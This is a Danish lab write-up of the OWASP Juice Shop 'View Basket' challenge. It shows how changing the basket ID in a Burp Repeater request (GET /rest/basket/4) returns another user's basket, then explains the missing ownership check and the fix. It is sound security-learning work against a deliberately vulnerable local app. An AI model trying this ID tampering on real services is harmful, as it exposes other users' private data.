# View Basket (⭐⭐)

**Kategori:** Broken Access Control (A01:2021) -- IDOR\
**Dato:** 2026-11-21\
**Miljø:** OWASP Juice Shop i Docker, Burp Suite Community\
**Status:** Løst\
**Tidsforbrug:** Ca. 10 min.

## Mål

Undersøge, om jeg kan se en anden brugers indkøbskurv ved at ændre
basket-ID'et i en request.

## Forventet adgangsregel

En bruger må kun kunne se sin egen indkøbskurv. Serveren skal
kontrollere, at kurven tilhører den bruger, der er logget ind.

## Fremgangsmåde

1.  Jeg åbnede **Burp Suite → Proxy → HTTP history**.
2.  Jeg fandt requesten, som blev sendt, da jeg åbnede **View Basket**.
3.  Jeg sendte requesten til **Repeater**.
4.  Jeg ændrede basket-ID'et i URL'en fra `6` til `4`.
5.  Jeg sendte requesten igen og fik et svar med status **200 OK**.

## Request

**Oprindelig basket:** `6`

**Ændret request:**

``` http
GET /rest/basket/4 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <gyldigt token>
```

Jeg har udeladt token, cookies og andre følsomme oplysninger fra
dokumentationen.

## Svar -- relevant del

``` json
{
  "status": "success",
  "data": {
    "id": 4,
    "UserId": 11,
    "Products": [
      {
        "id": 4,
        "name": "Raspberry Juice (1000ml)",
        "BasketItem": {
          "ProductId": 4,
          "BasketId": 4,
          "quantity": 2
        }
      }
    ]
  }
}
```

## Resultat og bevis

Serveren returnerede indholdet af basket `4` med status `200 OK`.

Mit token tilhørte bruger med ID `26`, mens svaret viste `UserId: 11`.
Det viser, at jeg kunne hente en indkøbskurv, der tilhørte en anden
bruger.

Opgaven blev dermed løst.

## Manglende kontrol

Serveren kontrollerede ikke tilstrækkeligt, om den indloggede bruger
ejede den indkøbskurv, der blev efterspurgt.

Det er **horisontal adgangskontrol**: En bruger får adgang til data, der
tilhører en anden bruger på samme rettighedsniveau.

## Konsekvens

En angriber kan potentielt ændre basket-ID'et og se andre brugeres
indkøbskurve. Det kan afsløre oplysninger om deres køb og produkter.

## Rettelse

Serveren skal kontrollere ejerskabet af kurven ved hvert opslag. Den må
ikke stole på basket-ID'et fra klienten alene.


## Overførsel til miseOS

Undersøg, om en bruger kan ændre et ID i en URL eller API-request og
dermed hente en anden brugers data.

Relevant test fra testmatrixen: **IDOR / horisontal adgangskontrol**.

## Det jeg lærte

Jeg lærte at finde requests i Burp Proxy og sende dem til Repeater.

Ved kun at ændre basket-ID'et fra `6` til `4` kunne jeg hente en anden
brugers kurv. Det viser, hvorfor serveren skal kontrollere ejerskab --
ikke kun om brugeren er logget ind.
